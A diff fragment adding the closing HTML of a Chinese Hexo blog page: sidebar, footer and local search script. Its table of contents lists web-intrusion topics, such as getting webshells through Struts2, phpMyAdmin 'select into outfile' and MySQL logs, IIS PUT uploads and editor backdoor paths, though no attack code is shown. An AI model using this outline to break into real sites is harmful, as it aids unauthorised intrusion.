+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/user.jpg"
+                alt="Virusday" />
+            
+              <p class="site-author-name" itemprop="name">Virusday</p>
+              <p class="site-description motion-element" itemprop="description">学习的日常</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Struct2-漏洞和PHP-admin批量拿网站shell"><span class="nav-number">1.</span> <span class="nav-text">Struct2 漏洞和PHP admin批量拿网站shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Struct2"><span class="nav-number">1.1.</span> <span class="nav-text">Struct2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows命令行"><span class="nav-number">1.2.</span> <span class="nav-text">windows命令行</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-1-用户账户与组账户"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.1 用户账户与组账户</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-2-Windows-默认账户"><span class="nav-number">1.2.2.</span> <span class="nav-text">1.2 Windows 默认账户</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-3-Windows-内置用户账户"><span class="nav-number">1.2.3.</span> <span class="nav-text">1.3 Windows 内置用户账户</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-4-查看用户的sid"><span class="nav-number">1.2.4.</span> <span class="nav-text">1.4 查看用户的sid</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1-5-查看、创建和删除账户"><span class="nav-number">1.2.5.</span> <span class="nav-text">1.5 查看、创建和删除账户</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phpMyAdmin"><span class="nav-number">1.3.</span> <span class="nav-text">phpMyAdmin</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#拿shell"><span class="nav-number">1.3.1.</span> <span class="nav-text">拿shell</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1、select-into-outfile写shell（但是要知道网站的绝对路径），select-basedir-mysql的绝对路径。【低于5-0？】"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">1、select into outfile写shell（但是要知道网站的绝对路径），select @@basedir mysql的绝对路径。【低于5.0？】</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2、利用日志写shell（mysql-gt-5-0）"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">2、利用日志写shell（mysql&gt;&#x3D;5.0）</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#后渗透"><span class="nav-number">1.3.2.</span> <span class="nav-text">后渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#3、获取管理员密码"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">3、获取管理员密码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4、php爆绝对路径"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">4、php爆绝对路径</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web渗透框架（N种漏洞经验）"><span class="nav-number">2.</span> <span class="nav-text">web渗透框架（N种漏洞经验）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#比较常见的编辑器漏洞"><span class="nav-number">3.</span> <span class="nav-text">比较常见的编辑器漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#编辑器默认的后台登录"><span class="nav-number">3.1.</span> <span class="nav-text">编辑器默认的后台登录</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1、关键文件的名称和路径"><span class="nav-number">3.1.1.</span> <span class="nav-text">1、关键文件的名称和路径</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2、ewebeditor编辑器一般默认数据库路径是db-ewebeditor-mdb"><span class="nav-number">3.1.2.</span> <span class="nav-text">2、ewebeditor编辑器一般默认数据库路径是db&#x2F;ewebeditor.mdb</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IIS-put漏洞拿shell"><span class="nav-number">4.</span> <span class="nav-text">IIS put漏洞拿shell</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-id-card"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Virusday</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">22.6k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Virusday</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
